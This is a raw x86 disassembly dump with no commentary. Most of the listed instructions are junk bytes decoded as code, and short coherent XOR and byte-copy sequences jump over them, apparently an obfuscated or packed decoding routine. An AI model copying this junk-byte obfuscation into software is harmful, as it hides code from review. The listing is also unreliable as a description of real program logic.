  404a05:	shr    BYTE PTR [eax-0x3d],cl
  404a08:	out    dx,eax
  404a09:	stos   BYTE PTR es:[edi],al
  404a0a:	mov    al,0x59
  404a0c:	int    0x99
  404a0e:	faddp  st(3),st
  404a10:	ror    BYTE PTR [edi],1
  404a12:	in     eax,0x10
  404a14:	pop    edi
  404a15:	and    eax,0xfdf7b605
  404a1a:	aas    
  404a1b:	stos   BYTE PTR es:[edi],al
  404a1c:	pop    ebp
  404a1d:	popf   
  404a1e:	cmp    dh,BYTE PTR [edi+0x3b]
  404a21:	ret    0x6842
  404a24:	mov    ecx,0x75481b42
  404a29:	dec    edi
  404a2a:	xor    DWORD PTR [edx],ebx
  404a2c:	xchg   BYTE PTR [ecx+0x56c3312b],ah
  404a32:	and    DWORD PTR [ecx-0x4c85df32],ebp
  404a38:	call   0x8bd4:0x4070a2c3
  404a3f:	jo     0x4049c1
  404a41:	sbb    ch,cl
  404a43:	xchg   bl,dl
  404a45:	xchg   ebp,eax
  404a46:	mov    gs,WORD PTR [edi-0x37]
  404a49:	dec    edx
  404a4a:	pop    es
  404a4b:	cli    
  404a4c:	pop    ebx
  404a4d:	push   ss
  404a4e:	ds jo  0x404a71
  404a51:	inc    esp
  404a52:	jg     0x404a72
  404a54:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404a56:	jl     0x404a37
  404a58:	mov    al,ds:0x3412bd23
  404a5d:	mov    ds:0x184dc4f7,eax
  404a62:	cdq    
  404a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a64:	xor    BYTE PTR [esi-0x488ba12e],0x2c
  404a6b:	jmp    FWORD PTR [edi-0xc]
  404a6e:	aam    0xc2
  404a70:	(bad)  
  404a72:	xchg   esp,eax
  404a73:	out    0x17,al
  404a75:	cli    
  404a76:	mov    ch,0xaa
  404a78:	mov    esp,0x8179a95f
  404a7d:	dec    ecx
  404a7e:	mov    esp,0xcf6124dd
  404a83:	das    
  404a84:	daa    
  404a85:	sbb    dl,BYTE PTR [ebx]
  404a87:	cdq    
  404a88:	imul   dh
  404a8a:	adc    esi,ebx
  404a8c:	hlt    
  404a8d:	mov    al,ah
  404a8f:	sub    DWORD PTR ds:[ebx*4+0x597b17d5],0x9e48ffb1
  404a9b:	shl    edx,0x30
  404a9e:	retf   
  404a9f:	mov    dl,0x76
  404aa1:	mov    bl,BYTE PTR [ebx]
  404aa3:	dec    ecx
  404aa4:	mov    ds:0xb8292f44,al
  404aa9:	outs   dx,DWORD PTR ds:[esi]
  404aaa:	cmp    esi,DWORD PTR [edi-0x15]
  404aad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aae:	xor    ah,cl
  404ab0:	mov    cl,0x7b
  404ab2:	or     eax,0xd2b444b3
  404ab7:	mov    dl,BYTE PTR [edi-0x26857ba8]
  404abd:	leave  
  404abe:	test   al,0x16
  404ac0:	fdiv   st,st(5)
  404ac2:	fnstenv [eax-0x6]
  404ac5:	fisub  DWORD PTR [ecx+0x74]
  404ac8:	sub    dh,BYTE PTR [edi+0x7f]
  404acb:	xchg   bl,cl
  404acd:	call   FWORD PTR [ebx-0x57da78f5]
  404ad3:	push   ss
  404ad4:	aad    0xac
  404ad6:	or     DWORD PTR [edi-0x57],0x3a
  404ada:	call   0x8b28fed3
  404adf:	jnp    0x404ae8
  404ae1:	add    edx,esp
  404ae3:	(bad)  
  404ae4:	pop    ds
  404ae5:	scas   eax,DWORD PTR es:[edi]
  404ae6:	retf   
  404ae7:	xor    al,BYTE PTR [eax-0x701870bd]
  404aed:	ins    BYTE PTR es:[edi],dx
  404aee:	mov    ebp,0x3b1dbb49
  404af3:	pushf  
  404af4:	push   ebp
  404af5:	mov    eax,ds:0x47a9ff4c
  404afa:	sub    ch,cl
  404afc:	shl    DWORD PTR [esi],cl
  404afe:	cmp    edi,DWORD PTR [esi]
  404b00:	pop    ds
  404b01:	loopne 0x404b10
  404b03:	mov    edi,0xdc4a9788
  404b08:	jb     0x404abf
  404b0a:	out    0x58,al
  404b0c:	mov    bl,0x60
  404b0e:	loope  0x404adf
  404b10:	cdq    
  404b11:	sbb    al,0xfc
  404b13:	pop    ecx
  404b14:	xchg   esi,eax
  404b15:	scas   eax,DWORD PTR es:[edi]
  404b16:	sub    cl,BYTE PTR [ecx+eax*2-0x6a]
  404b1a:	outs   dx,DWORD PTR ds:[esi]
  404b1b:	adc    edi,DWORD PTR [esi+edx*4]
  404b1e:	pop    ds
  404b1f:	push   edx
  404b20:	cmp    DWORD PTR [eax+0xf28d89a],ebx
  404b26:	push   esp
  404b27:	pop    es
  404b28:	mov    dh,0xd
  404b2a:	leave  
  404b2b:	sub    dh,BYTE PTR [edi+0x2211fadd]
  404b31:	nop
  404b32:	mov    ds:0x96a1bd7b,eax
  404b37:	out    0x8c,eax
  404b39:	xchg   edi,eax
  404b3a:	hlt    
  404b3b:	in     al,dx
  404b3c:	nop
  404b3d:	std    
  404b3e:	jo     0x404adf
  404b40:	or     al,0xb3
  404b42:	xchg   bh,al
  404b44:	sub    DWORD PTR [bx+di+0x116b],edi
  404b49:	inc    edx
  404b4a:	retf   
  404b4b:	jo     0x404aef
  404b4d:	mov    ch,0x43
  404b4f:	mov    dh,0xc
  404b51:	mov    ds:0x1aa83faf,eax
  404b56:	or     BYTE PTR [esp+ebp*4+0x79074892],bh
  404b5d:	out    0x2b,eax
  404b5f:	arpl   WORD PTR [esi],bx
  404b61:	dec    eax
  404b62:	add    BYTE PTR [esi-0x62],dh
  404b65:	repz mov eax,ds:0xb4c6353c
  404b6b:	cmp    eax,0x8b7d1460
  404b70:	jge    0x404b56
  404b72:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404b79:	mov    BYTE PTR [ebp+0xb],dl
  404b7c:	mov    dl,BYTE PTR [ebp+0xf]
  404b7f:	mov    edi,DWORD PTR [ebp-0xc]
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	and    ah,BYTE PTR [ebp+0x2e2efba3]
  404b9e:	jle    0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404b79
  404ba5:	(bad)  
  404ba6:	mov    ds:0x29460b2f,al
  404bab:	dec    esp
  404bac:	mov    ah,0xfb
  404bae:	(bad)  [esi-0x5f]
  404bb1:	mov    DWORD PTR [ecx-0x5ada630a],esi
  404bb7:	pop    ecx
  404bb8:	add    al,ah
  404bba:	and    ebx,DWORD PTR [ecx-0x59]
  404bbd:	xchg   edx,eax
  404bbe:	sar    BYTE PTR [ebx+0x7359feb7],0x8c
  404bc5:	dec    ebp
  404bc6:	daa    
  404bc7:	vmaxsd xmm5,xmm0,QWORD PTR [eax]
  404bcb:	shl    DWORD PTR [edi+0x2f93515b],1
  404bd1:	nop
  404bd2:	ret    0x19ac
  404bd5:	(bad)  
  404bd6:	fdivrp st(0),st
  404bd8:	test   DWORD PTR [edi],esp
  404bda:	push   ebp
  404bdb:	aad    0x6a
  404bdd:	jne    0x404bab
  404bdf:	in     al,0x67
  404be1:	test   ch,ah
  404be3:	lock ret 
  404be5:	mov    bl,0x6f
  404be7:	addr16 jmp 0x38f4:0xab033c41
  404bef:	push   ebx
  404bf0:	sar    BYTE PTR [edi+edi*4],cl
  404bf3:	scas   al,BYTE PTR es:[edi]
  404bf4:	mov    dl,0x6d
  404bf6:	cdq    
  404bf7:	in     al,dx
  404bf8:	or     al,0xfd
  404bfa:	sub    edx,eax
  404bfc:	loopne 0x404bdf
  404bfe:	stos   DWORD PTR es:[edi],eax
  404bff:	sbb    al,dh
  404c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c02:	in     al,dx
  404c03:	and    al,0x77
  404c05:	fidiv  DWORD PTR [ebp-0x21]
  404c08:	and    ch,cl
  404c0a:	jecxz  0x404c1b
  404c0c:	mov    esi,0xc54ec49f
  404c11:	rcl    DWORD PTR [ecx],1
  404c13:	cli    
  404c14:	adc    edx,ebx
  404c16:	add    dl,bh
  404c18:	xchg   ebx,eax
  404c19:	and    eax,DWORD PTR [eax]
  404c1b:	(bad)  
  404c1c:	mov    ebx,0x19bc04f0
  404c21:	call   0xaacb:0x446dbed3
  404c28:	add    DWORD PTR [ecx+0x3aa0eeb2],edi
  404c2e:	ins    BYTE PTR es:[edi],dx
  404c2f:	iret   
  404c30:	hlt    
  404c31:	push   esi
  404c32:	push   edx
  404c33:	dec    edx
  404c34:	push   esi
  404c35:	out    dx,al
  404c36:	dec    BYTE PTR [ebx]
  404c38:	mov    edx,0xb9f395f
  404c3d:	or     eax,0xaccea31c
  404c42:	lods   eax,DWORD PTR ds:[esi]
  404c43:	jno    0x404bee
  404c45:	pop    ecx
  404c46:	or     BYTE PTR [edx+esi*1-0x1a],bh
  404c4a:	mov    bl,0xee
  404c4c:	imul   edi,DWORD PTR [ecx-0x11],0x719f67a7
  404c53:	(bad)  
  404c54:	push   esi
  404c56:	aad    0x75
  404c58:	fwait
  404c59:	push   es
  404c5a:	or     dl,dl
  404c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c5d:	xor    al,BYTE PTR [esi+0x64]
  404c60:	fisttp QWORD PTR [ebp-0x5c1d5210]
  404c66:	fsub   st,st(0)
  404c68:	or     BYTE PTR [esi+edi*2+0x1f],ch
  404c6c:	pop    ss
  404c6d:	cmp    DWORD PTR ds:0x485c71c2,0xffffffa0
  404c74:	and    eax,0x666b0c40
  404c79:	and    al,0x16
  404c7b:	pop    ss
  404c7c:	int    0x6c
  404c7e:	jg     0x404c79
  404c80:	xor    eax,0x848ecac
  404c85:	cmp    bl,BYTE PTR [esp+eax*8-0x69]
  404c89:	repz test BYTE PTR [ebp-0x25],dh
  404c8d:	je     0x404c79
  404c8f:	mov    BYTE PTR [eax+0x27],ah
  404c92:	popa   
  404c93:	push   0xffffffa6
  404c95:	jl     0x404cae
  404c97:	add    BYTE PTR [edi],bh
  404c99:	stos   BYTE PTR es:[edi],al
  404c9a:	test   al,0x8b
  404c9c:	rol    cl,1
  404c9e:	mov    ecx,0x20471645
  404ca3:	in     eax,dx
  404ca4:	lds    edx,FWORD PTR [esi+0x268549c3]
  404caa:	or     al,0xc2
  404cac:	cmp    cl,0xd0
  404caf:	lahf   
  404cb0:	inc    ebx
  404cb1:	test   al,0x7e
  404cb3:	dec    esi
  404cb4:	pop    edi
  404cb5:	js     0x404d1e
  404cb7:	into   
  404cb8:	retf   
  404cb9:	(bad)  
  404cba:	out    0xe4,eax
  404cbc:	pushf  
  404cbd:	cli    
  404cbe:	jl     0x404cfa
  404cc0:	lea    edx,[edi+ebp*1]
  404cc3:	jg     0x404c55
  404cc5:	sub    eax,0xefde6706
  404cca:	aad    0xac
  404ccc:	push   es
  404ccd:	fisubr WORD PTR [edi+0x9]
  404cd0:	(bad)  
  404cd1:	cmp    BYTE PTR [esi],ch
  404cd3:	mov    al,ds:0x4a88b7f7
  404cd8:	ret    0x3d4f
  404cdb:	test   al,0x54
  404cdd:	push   es
  404cde:	mov    bh,0x20
  404ce0:	mov    edx,0xd4f96b18
  404ce6:	adc    ebp,DWORD PTR [edx+0x319ac2a5]
  404cec:	mov    dl,0x3a
  404cee:	jnp    0x404cd9
  404cf0:	mov    ds:0x18f51d13,eax
  404cf5:	mov    edx,0x952a4ba7
  404cfa:	lahf   
  404cfb:	cmp    dl,BYTE PTR [esi]
  404cfd:	pop    ecx
  404cfe:	mov    ch,0x90
  404d00:	push   ecx
  404d01:	mov    ch,0x83
  404d03:	test   BYTE PTR [ecx+0x31d9c4ab],bh
  404d09:	icebp  
  404d0a:	daa    
  404d0b:	arpl   sp,bp
  404d0d:	test   al,0x49
  404d0f:	jmp    0x404ca3
  404d11:	jnp    0x404d12
  404d13:	ins    DWORD PTR es:[edi],dx
  404d14:	jae    0x404d6d
  404d16:	push   ebx
  404d17:	pop    edx
  404d18:	push   edi
  404d19:	mov    ds:0x51f311ed,al
  404d1e:	mov    al,ds:0x65e5b404
  404d23:	sub    al,0x8e
  404d25:	sbb    al,BYTE PTR [ebp-0x537a2f1e]
  404d2b:	call   0x99036ebd
  404d30:	mov    bl,0x8b
  404d32:	pop    ebp
  404d33:	in     al,0x88
  404d35:	xchg   esp,eax
  404d36:	pop    ds
  404d37:	popf   
  404d38:	jb     0x404d6c
  404d3a:	add    BYTE PTR [edx+0x7d8b0b55],cl
  404d40:	call   0x7d444578
  404d45:	in     al,dx
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    dh,bl
  404d93:	jge    0x404d62
  404d95:	push   0x7e7e2fbb
  404d9a:	mov    edi,DWORD PTR [edi+0x7e]
  404d9d:	jle    0x404ddf
  404d9f:	loope  0x404e0d
  404da1:	repz add eax,0xaf077568
  404da7:	aam    0xc1
  404da9:	xor    bh,BYTE PTR [ebx-0x62]
  404dac:	jno    0x404d3f
  404dae:	inc    esp
  404daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404db0:	(bad)  
  404db1:	retf   
  404db2:	(bad)  ds:0xee5a9484
  404db8:	call   0x4bcc1097
  404dbd:	retf   
  404dbe:	mov    edi,0xbc37b83f
  404dc3:	mov    eax,0x14682fd8
  404dc8:	push   edx
  404dc9:	cwde   
  404dca:	mov    dl,0xe7
  404dcc:	lahf   
  404dcd:	repz sbb eax,0x8aab70c1
  404dd3:	(bad)  
  404dd4:	aam    0x8a
  404dd6:	dec    esp
  404dd7:	sbb    ch,dl
  404dd9:	xchg   esi,eax
  404dda:	int3   
  404ddb:	fyl2xp1 
  404ddd:	xor    dh,BYTE PTR [eax]
  404ddf:	dec    ebp
  404de0:	gs xor al,0xf1
  404de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404de4:	stc    
  404de5:	pop    ecx
  404de6:	or     bh,bl
  404de8:	retf   
  404de9:	or     DWORD PTR [eax],ebx
  404deb:	sbb    DWORD PTR [esi],0xffffffb1
  404dee:	jg     0x404e38
  404df0:	add    BYTE PTR [eax+0x5343a82],cl
  404df6:	in     eax,dx
  404df7:	je     0x404e40
  404df9:	scas   eax,DWORD PTR es:[edi]
  404dfa:	pop    esi
  404dfb:	jo     0x404db5
  404dfd:	dec    esi
  404dfe:	iret   
  404dff:	test   DWORD PTR [edi-0x3a],edi
  404e02:	(bad)  [ebx]
  404e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e05:	mov    edi,DWORD PTR [edx+ecx*8]
  404e08:	add    eax,0xa881e5ef
  404e0d:	mov    ds:0x89ceefbd,al
  404e12:	add    al,0xef
  404e14:	sub    BYTE PTR [ecx],dh
  404e16:	jp     0x404e81
  404e18:	push   es
  404e19:	ins    DWORD PTR es:[edi],dx
  404e1a:	addr16 jne 0x404de8
  404e1d:	mov    ch,0x6d
  404e1f:	idiv   ch
  404e21:	or     bh,BYTE PTR [esi]
  404e23:	pop    eax
  404e24:	mov    ebp,0x50beea42
  404e29:	mov    ecx,esp
  404e2b:	jb     0x404e9e
  404e2d:	fdivr  st(5),st
  404e2f:	mov    BYTE PTR [ecx-0x2ba8dd8b],dh
  404e35:	test   eax,0xfb890bd5
  404e3a:	push   es
  404e3b:	stc    
  404e3c:	cmp    esp,DWORD PTR [ebx-0x6f]
  404e3f:	sub    esp,DWORD PTR [edx+0x7c]
  404e42:	mov    ebx,edx
  404e44:	repnz push 0xed39218c
  404e4a:	(bad)  
  404e4b:	or     al,0x33
  404e4d:	ret    0x2e2e
  404e50:	jo     0x404ea1
  404e52:	outs   dx,BYTE PTR ds:[esi]
  404e53:	sahf   
  404e54:	push   es
  404e55:	mov    dl,0x40
  404e57:	xor    al,0xb
  404e59:	mov    BYTE PTR ss:[edx-0x6135d1f7],ah
  404e60:	enter  0xf49b,0x8
  404e64:	mov    dl,0xdb
  404e66:	lds    edi,FWORD PTR [ecx+edx*4+0xbdb8c6b]
  404e6d:	ins    BYTE PTR es:[edi],dx
  404e6e:	pop    edi
  404e6f:	clc    
  404e70:	sti    
  404e71:	test   al,0x5e
  404e73:	mov    ecx,0x4feaee93
  404e78:	cmp    al,0x2d
  404e7a:	rol    BYTE PTR ds:0x378177fd,cl
  404e80:	sub    edx,esp
  404e82:	aas    
  404e83:	in     eax,0x9c
  404e85:	dec    DWORD PTR [edx-0x71e46d6a]
  404e8b:	mov    eax,ds:0x73c38dfa
  404e90:	loopne 0x404e21
  404e92:	cmp    eax,0x975fa03d
  404e97:	cmp    BYTE PTR [eax],ch
  404e99:	mov    bh,0x2a
  404e9b:	test   BYTE PTR ds:0x72a281f2,bh
  404ea1:	and    DWORD PTR [edx-0x63],edx
  404ea4:	mov    bh,BYTE PTR [eax]
  404ea6:	push   esi
  404ea7:	cmc    
  404ea8:	lock pushf 
  404eaa:	cmp    al,BYTE PTR [eax+0x6f48043a]
  404eb0:	push   ds
  404eb1:	mov    cl,0x14
  404eb3:	pusha  
  404eb4:	lods   al,BYTE PTR ds:[esi]
  404eb5:	rcr    edx,1
  404eb7:	shl    BYTE PTR [ecx+0x4b],cl
  404eba:	pop    es
  404ebb:	loopne 0x404e5e
  404ebd:	in     eax,dx
  404ebe:	in     al,dx
  404ebf:	stos   BYTE PTR es:[edi],al
  404ec0:	inc    ebp
  404ec1:	shr    BYTE PTR [ecx],0x95
  404ec4:	sub    DWORD PTR [eax],edi
  404ec6:	mov    BYTE PTR [ebx-0x700ccf80],bl
  404ecc:	jno    0x404ec2
  404ece:	dec    eax
  404ecf:	push   0x9
  404ed1:	and    cl,BYTE PTR [ecx-0x56c9084e]
  404ed7:	out    0xc5,al
  404ed9:	loope  0x404f33
  404edb:	pop    ebx
  404edc:	mov    bl,BYTE PTR [ebp-0x3e]
  404edf:	lods   al,BYTE PTR ds:[esi]
  404ee0:	or     eax,0x25f611fd
  404ee5:	bound  esp,QWORD PTR [edx+0xc]
  404ee8:	jmp    0xbe12:0x498db90d
  404eef:	xchg   BYTE PTR [edi+eiz*8-0x1b2b22d1],bh
  404ef6:	sahf   
  404ef7:	jns    0x404ef8
  404ef9:	push   ebp
  404efa:	fisub  DWORD PTR [edi-0x51]
  404efd:	cld    
  404efe:	mov    edx,0x77acbe60
  404f03:	mov    eax,ds:0x3c067d00
  404f08:	imul   ebx,DWORD PTR [ebx-0x348d1f01],0xffffffb7
  404f0f:	jb     0x404f60
  404f11:	iret   
  404f12:	test   eax,esi
  404f14:	mov    eax,0x40813e1a
  404f19:	or     DWORD PTR [ecx],0x7f
  404f1c:	dec    esp
  404f1d:	jno    0x404ede
  404f1f:	pop    es
  404f20:	add    DWORD PTR [eax],edx
  404f22:	cdq    
  404f23:	ret    0x94d1
  404f26:	sub    ebp,edx
  404f28:	or     eax,0xf8333299
  404f2d:	add    edi,ecx
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0xa0d15a29
  404f44:	retf   0xf22d
  404f47:	enter  0x7e21,0x7e
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404f19
  404f50:	rol    eax,1
  404f52:	leave  
  404f53:	pop    ds
  404f54:	sub    dh,cl
  404f56:	dec    esp
  404f57:	inc    ebx
  404f58:	sti    
  404f59:	clc    
  404f5a:	icebp  
  404f5b:	(bad)  
  404f5c:	adc    al,BYTE PTR [esi-0x56]
  404f5f:	jae    0x404f86
  404f61:	stc    
  404f62:	mov    ecx,0x48e63916
  404f67:	and    BYTE PTR [ebx],dl
  404f69:	mov    dh,0x1f
  404f6b:	loope  0x404fa9
  404f6d:	sbb    al,0x57
  404f6f:	dec    edi
  404f70:	fsub   QWORD PTR [ecx+eax*2]
  404f73:	ret    
  404f74:	dec    ecx
  404f75:	pop    esi
  404f76:	adc    BYTE PTR [edi],cl
  404f78:	iret   
  404f79:	adc    DWORD PTR [ebx-0x5b],ebp
  404f7c:	vmulpd ymm5,ymm5,YMMWORD PTR [ecx+0x7f]
  404f81:	sub    DWORD PTR [ebx+0x4f],0xffffff8d
  404f85:	cli    
  404f86:	stos   DWORD PTR es:[edi],eax
  404f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f88:	or     esp,DWORD PTR ds:0xdc505332
  404f8e:	scas   eax,DWORD PTR es:[edi]
  404f8f:	mov    cl,0x4c
  404f91:	pop    ebx
  404f92:	in     eax,dx
  404f93:	add    BYTE PTR [eax-0x79852f41],cl
  404f99:	push   cs
  404f9a:	shr    DWORD PTR [esi+0x2e],cl
  404f9d:	lods   eax,DWORD PTR ds:[esi]
  404f9e:	test   al,0x1
  404fa0:	popa   
  404fa1:	and    ebx,DWORD PTR [eax+edx*1+0x12]
  404fa5:	retf   0xe2a0
  404fa8:	cld    
  404fa9:	jge    0x404f6f
  404fab:	ret    0x43e7
  404fae:	jle    0x404f82
  404fb0:	dec    esp
  404fb1:	sahf   
  404fb2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  404fb4:	mov    edx,0x5d38fad8
  404fb9:	adc    dh,BYTE PTR [ebp+0x36dad16]
  404fbf:	xchg   esp,eax
  404fc0:	add    esi,esp
  404fc2:	shl    eax,1
  404fc4:	adc    BYTE PTR [edx+edx*8],cl
  404fc7:	jbe    0x404fbb
  404fc9:	in     al,dx
  404fca:	inc    ecx
  404fcb:	dec    ebx
  404fcc:	push   ds
  404fcd:	mov    esp,?
  404fcf:	inc    edx
  404fd0:	cli    
  404fd1:	js     0x404fa5
  404fd3:	imul   eax,DWORD PTR ds:0x318d32fa,0x3b
  404fda:	pusha  
  404fdb:	mov    ds:0xf86e44e5,eax
  404fe0:	fdiv   DWORD PTR [edi-0x67]
  404fe3:	mov    ch,0xf3
  404fe5:	stc    
  404fe6:	cmp    eax,0x3462c256
  404feb:	mov    eax,ebx
  404fed:	lea    eax,[edx]
  404fef:	arpl   WORD PTR [eax],cx
  404ff1:	lods   eax,DWORD PTR ds:[esi]
  404ff2:	jns    0x404f91
  404ff4:	jns    0x404f8c
  404ff6:	cmp    cl,0xce
  404ff9:	mov    esp,0x1ad7bb0
  404ffe:	imul   ecx,DWORD PTR [eax],0xfffffffa
  405001:	pop    eax
  405002:	jge    0x404fbc
  405004:	adc    cl,ah
  405006:	mov    dh,0x53
  405008:	and    al,0x23
  40500a:	inc    esp
  40500b:	test   BYTE PTR ds:0xfb3cd5b,bh
  405011:	jp     0x404fe8
  405013:	out    0x2,eax
  405015:	xor    esi,DWORD PTR [ebx]
  405017:	into   
  405018:	push   0x78
  40501a:	(bad)  
  40501b:	xchg   esi,eax
  40501c:	mov    ds:0x621da323,eax
  405021:	sub    al,0x1
  405023:	xchg   edi,eax
  405024:	lea    esp,[edx+0x3e]
  405027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405028:	sub    BYTE PTR [ecx],bh
  40502a:	jmp    0x404fb8
  40502c:	mov    eax,0x673e0a9a
  405031:	lahf   
  405032:	cmp    eax,0x1f89a9b3
  405037:	sub    dl,dh
  405039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40503a:	leave  
  40503b:	pusha  
  40503c:	mov    bl,0xa8
  40503e:	fwait
  40503f:	mov    esi,0x4afce702
  405044:	ja     0x4050ae
  405046:	inc    ecx
  405047:	jle    0x404ff7
  405049:	int    0x5
  40504b:	pop    es
  40504c:	sti    
  40504d:	adc    cl,BYTE PTR [esi-0x38]
  405050:	pop    esi
  405051:	xchg   edi,eax
  405052:	jo     0x40503d
  405054:	in     eax,dx
  405055:	lods   eax,DWORD PTR ds:[esi]
  405056:	add    dl,cl
  405058:	dec    ebp
  405059:	jb     0x4050b0
  40505b:	mov    al,0x77
  40505d:	dec    eax
  40505e:	xchg   esi,eax
  40505f:	jo     0x405027
  405061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405062:	push   cs
  405063:	sbb    eax,0x67adc606
  405068:	jnp    0x405022
  40506a:	dec    edi
  40506b:	dec    ebx
  40506c:	sub    al,0xba
  40506e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40506f:	mov    ebx,0xcbae99f3
  405074:	dec    DWORD PTR [ebx-0x3a]
  405077:	xlat   BYTE PTR ds:[ebx]
  405078:	sub    eax,0x88d3ba96
  40507d:	imul   ebx,ecx,0xffffffd5
  405080:	in     eax,dx
  405081:	adc    WORD PTR [eax],di
  405084:	(bad)  
  405085:	mov    ch,0x92
  405087:	pop    edx
  405088:	push   esp
  405089:	sbb    eax,0xd8f27bb5
  40508e:	or     al,0xaa
  405090:	scas   eax,DWORD PTR es:[edi]
  405091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405092:	icebp  
  405093:	add    ebp,DWORD PTR [ecx-0x609bbf91]
  405099:	retf   0xd9e0
  40509c:	ret    
  40509d:	ret    0xc828
  4050a0:	cdq    
  4050a1:	xor    DWORD PTR [esi-0x69],edi
  4050a4:	(bad)  
  4050a5:	das    
  4050a6:	mov    edx,0x84a5500d
  4050ab:	sbb    ebx,DWORD PTR [ebx]
  4050ad:	pusha  
  4050ae:	mov    edx,0x8b2e06a7
  4050b3:	xor    DWORD PTR [eax+0x61e92955],esi
  4050b9:	xchg   ebx,eax
  4050ba:	xlat   BYTE PTR ds:[ebx]
  4050bb:	fnstcw WORD PTR es:[eax-0x78f1aa2d]
  4050c2:	xor    DWORD PTR [esi-0x80],ecx
  4050c5:	js     0x4050b1
  4050c7:	data16 out dx,al
  4050c9:	inc    esi
  4050ca:	cld    
  4050cb:	xchg   ecx,eax
  4050cc:	inc    edi
  4050cd:	push   ecx
  4050ce:	cmp    dh,BYTE PTR [edx+0x48]
  4050d1:	pop    ebx
  4050d2:	int3   
  4050d3:	add    BYTE PTR [eax+edi*8],ah
  4050d6:	in     eax,0xe5
  4050d8:	mov    ch,0x42
  4050da:	mov    bl,0xfb
  4050dc:	mov    ebx,DWORD PTR [ebp-0x18]
  4050df:	xor    ebx,eax
  4050e1:	sub    edx,ecx
  4050e3:	lea    edi,[edi+ebx*1+0x32729d]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	dec    esp
  40510e:	enter  0x4122,0x45
  405112:	and    bh,BYTE PTR [esi+0x7e]
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x405140
  40511a:	clc    
  40511b:	xchg   edx,eax
  40511c:	leave  
  40511d:	cmc    
  40511e:	imul   esi,DWORD PTR [edi+0x4b],0xaee4c294
  405125:	std    
  405126:	fiadd  DWORD PTR [esi]
  405128:	mov    ecx,DWORD PTR [ebx+ebx*8+0x6b]
  40512c:	sbb    ecx,DWORD PTR [edi+0x5a]
  40512f:	push   0x32fdfb5
  405134:	cdq    
  405135:	(bad)  
  405136:	fild   WORD PTR [ecx-0x33]
  405139:	cmc    
  40513a:	dec    ecx
  40513b:	sahf   
  40513c:	sbb    al,0x8b
  40513e:	or     DWORD PTR [ecx],edi
  405140:	popf   
  405141:	jle    0x4050c6
  405143:	jbe    0x40512a
  405145:	push   esp
  405146:	dec    DWORD PTR [edx-0x46]
  405149:	std    
  40514a:	outs   dx,DWORD PTR ds:[esi]
  40514b:	mov    BYTE PTR [esi+0xb14fa7e],ch
  405151:	or     bl,BYTE PTR [edi-0x78ee9e1c]
  405157:	jp     0x405148
  405159:	xchg   esp,eax
  40515a:	sbb    eax,0xc3ae2b8c
  40515f:	inc    edx
  405160:	pop    eax
  405161:	xor    edi,DWORD PTR [edx+0x29]
  405164:	mov    ds:0x53ea9aca,al
  405169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40516a:	test   eax,0x6b401574
  40516f:	mov    ds:0x483ba32e,eax
  405174:	sub    al,BYTE PTR [ecx-0x1]
  405177:	add    BYTE PTR [ecx+0x6c9ba1e1],0xf9
  40517e:	jge    0x4051fc
  405180:	ds jae 0x405113
  405183:	mov    ah,0xb9
  405185:	pop    esi
  405186:	sub    esp,DWORD PTR [esi-0x672b8b8a]
  40518c:	xchg   esi,eax
